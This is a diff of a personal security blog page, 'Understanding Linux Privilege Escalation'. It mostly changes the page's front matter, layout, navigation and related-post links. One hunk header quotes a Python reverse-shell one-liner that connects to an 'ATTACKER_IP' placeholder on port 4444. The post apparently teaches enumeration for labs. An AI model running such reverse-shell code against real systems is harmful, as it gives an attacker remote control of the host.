@@ -1,29 +1,62 @@
----
-layout: post
-article: true
-slug: linux-privilege-escalation
-title: "Understanding Linux Privilege Escalation"
-description: "A focused guide to common Linux privilege escalation paths, including SUID abuse, cron jobs, weak permissions, and systematic enumeration."
-excerpt: "A focused guide to common Linux privilege escalation paths, including SUID abuse, cron jobs, weak permissions, and systematic enumeration."
-post_subtitle: "A focused guide to common Linux privilege escalation paths, including SUID abuse, cron jobs, weak permissions, and systematic enumeration."
-summary: "A practical reference for enumerating Linux systems and validating the most common privilege escalation paths in labs or post-exploitation scenarios."
-target_lab: "Linux privilege escalation labs and post-exploitation scenarios"
-tools_used:
-  - "Bash"
-  - "LinPEAS"
-  - "GTFOBins"
-  - "sudo"
-takeaways:
-  - "Start with enumeration before reaching for any exploit."
-  - "Check SUID, sudo, cron, PATH, and writable scripts before chasing edge cases."
-  - "Validate every escalation path against the target's permissions and runtime context."
-date: 2025-07-30
-read_time: "~8 min read"
-permalink: /blog/Linux-Privilege-Escalation.html
-tags:
-  - "Linux"
----
-<style>
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Understanding Linux Privilege Escalation - Vali Hakuryuko</title>
+  <meta name="description" content="A focused guide to common Linux privilege escalation paths, including SUID abuse, cron jobs, weak permissions, and systematic enumeration." />
+  <meta property="og:title" content="Understanding Linux Privilege Escalation - Vali Hakuryuko" />
+  <meta property="og:description" content="A focused guide to common Linux privilege escalation paths, including SUID abuse, cron jobs, weak permissions, and systematic enumeration." />
+  <meta property="og:type" content="article" />
+  <meta property="og:image" content="/image/profile.jpg" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=Outfit:wght@300;400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="/style.css" />
+  <link rel="stylesheet" href="/post.css" />
+</head>
+<body class="post-page">
+  <nav>
+    <a href="/index.html" class="nav-logo"><span>~/</span>Vali</a>
+    <ul class="nav-links">
+      <li><a href="/index.html#about">About</a></li>
+      <li><a href="/blog.html">Blog</a></li>
+      <li><a href="/index.html#contact">Contact</a></li>
+    </ul>
+    <button class="theme-btn" onclick="toggleTheme()">[ theme ]</button>
+  </nav>
+  <div class="layout">
+    <header class="post-header">
+      <div class="post-breadcrumb"><a href="/index.html">~</a> / <a href="/blog.html">blog</a> / linux-privilege-escalation</div>
+      <div class="post-meta-row">
+        <span class="post-date">2025-07-30</span>
+        <a href="/blog.html?tag=linux" class="post-tag-link" aria-label="Browse Linux posts"><span class="post-tag">Linux</span></a>
+        <span class="post-read-time">~8 min read</span>
+      </div>
+      <h1 class="post-title">Understanding Linux Privilege Escalation</h1>
+      <p class="post-subtitle">A focused guide to common Linux privilege escalation paths, including SUID abuse, cron jobs, weak permissions, and systematic enumeration.</p>
+    </header>
+    <section class="article-brief" aria-label="Article overview">
+  <div class="article-brief-grid">
+    <div class="article-brief-block">
+      <span class="article-brief-label">What This Covers</span>
+      <p>A practical reference for enumerating Linux systems and validating the most common privilege escalation paths in labs or post-exploitation scenarios.</p>
+    </div>
+    <div class="article-brief-block">
+      <span class="article-brief-label">Target / Lab</span>
+      <p>Linux privilege escalation labs and post-exploitation scenarios</p>
+    </div>
+    <div class="article-brief-block">
+      <span class="article-brief-label">Tools Used</span>
+      <div class="article-tools"><span class="article-tool">Bash</span><span class="article-tool">LinPEAS</span><span class="article-tool">GTFOBins</span><span class="article-tool">sudo</span></div>
+    </div>
+    <div class="article-brief-block article-brief-wide">
+      <span class="article-brief-label">Key Takeaways</span>
+      <ul class="article-takeaways"><li>Start with enumeration before reaching for any exploit.</li><li>Check SUID, sudo, cron, PATH, and writable scripts before chasing edge cases.</li><li>Validate every escalation path against the target&#x27;s permissions and runtime context.</li></ul>
+    </div>
+  </div>
+</section>
+    <style>
     article h2 { font-family: var(--display); font-size: 1.45rem; font-weight: 700; margin: 3rem 0 1rem; letter-spacing: -0.02em; padding-top: 1rem; border-top: 1px solid var(--border); }
     article h2:first-child { border-top: none; margin-top: 0; }
     article h3 { font-family: var(--display); font-size: 1.1rem; font-weight: 600; margin: 1.75rem 0 0.75rem; color: var(--text); }
@@ -253,3 +286,68 @@ python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",4444
       </div>
 
     </article>
+
+    <section class="post-navigation" aria-labelledby="post-navigation-title">
+      <div class="post-section-head">
+        <div>
+          <span class="post-section-label">Continue reading</span>
+          <h2 id="post-navigation-title" class="post-section-title">Move through the archive</h2>
+        </div>
+        <a href="/blog.html" class="btn">Browse all posts</a>
+      </div>
+      <div class="post-nav-grid"><a href="/blog/sqli-labs.html" class="post-nav-card">
+  <span class="post-nav-label">Newer post</span>
+  <strong class="post-nav-title">PortSwigger SQLi Labs Write-Up</strong>
+  <span class="post-nav-meta">2026-04-02 . ~45 min read</span>
+</a><a href="/blog/burp-suite-basics.html" class="post-nav-card">
+  <span class="post-nav-label">Older post</span>
+  <strong class="post-nav-title">Getting Started with Burp Suite</strong>
+  <span class="post-nav-meta">2025-07-23 . ~5 min read</span>
+</a></div>
+    </section>
+    <section class="post-related" aria-labelledby="related-posts-title">
+      <div class="post-section-head">
+        <div>
+          <span class="post-section-label">Keep exploring</span>
+          <h2 id="related-posts-title" class="post-section-title">More from the archive</h2>
+        </div>
+        <p class="post-section-copy">A few more write-ups to keep the thread going.</p>
+      </div>
+      <div class="related-posts-grid"><a href="/blog/juice-shop-writeup.html" class="related-post-card">
+  <div class="related-post-meta">
+    <span class="post-date">2026-04-03</span>
+    <span class="post-tag">Web</span><span class="post-tag">Burp Suite</span>
+  </div>
+  <h3 class="related-post-title">OWASP Juice Shop Write-Up</h3>
+  <p class="related-post-excerpt">A practical walkthrough of OWASP Juice Shop, covering challenge discovery, exploitation paths, and the use of Burp Suite against a modern training target.</p>
+  <span class="related-post-read">Read article</span>
+</a><a href="/blog/sqli-labs.html" class="related-post-card">
+  <div class="related-post-meta">
+    <span class="post-date">2026-04-02</span>
+    <span class="post-tag">Web</span><span class="post-tag">Port Swigger</span>
+  </div>
+  <h3 class="related-post-title">PortSwigger SQLi Labs Write-Up</h3>
+  <p class="related-post-excerpt">A structured walkthrough of PortSwigger SQL injection labs, including manual testing, Python-assisted exploitation, and the reasoning behind each step.</p>
+  <span class="related-post-read">Read article</span>
+</a><a href="/blog/burp-suite-basics.html" class="related-post-card">
+  <div class="related-post-meta">
+    <span class="post-date">2025-07-23</span>
+    <span class="post-tag">Burp Suite</span>
+  </div>
+  <h3 class="related-post-title">Getting Started with Burp Suite</h3>
+  <p class="related-post-excerpt">A practical introduction to Burp Suite&#x27;s core tools, showing how Proxy, Repeater, Intruder, and Scanner fit into a modern web testing workflow.</p>
+  <span class="related-post-read">Read article</span>
+</a></div>
+    </section>
+    <div class="post-footer">
+      <a href="/blog.html" class="btn">&larr; Back to blog</a>
+      <span class="post-footer-note">Use the topic tags above to jump into the matching archive filter.</span>
+    </div>
+  </div>
+  <footer>
+    <span>(c) 2026 Vali Hakuryuko</span>
+    <span class="footer-back" onclick="window.scrollTo({top:0,behavior:'smooth'})">^ back to top</span>
+  </footer>
+  <script src="/script.js"></script>
+</body>
+</html>
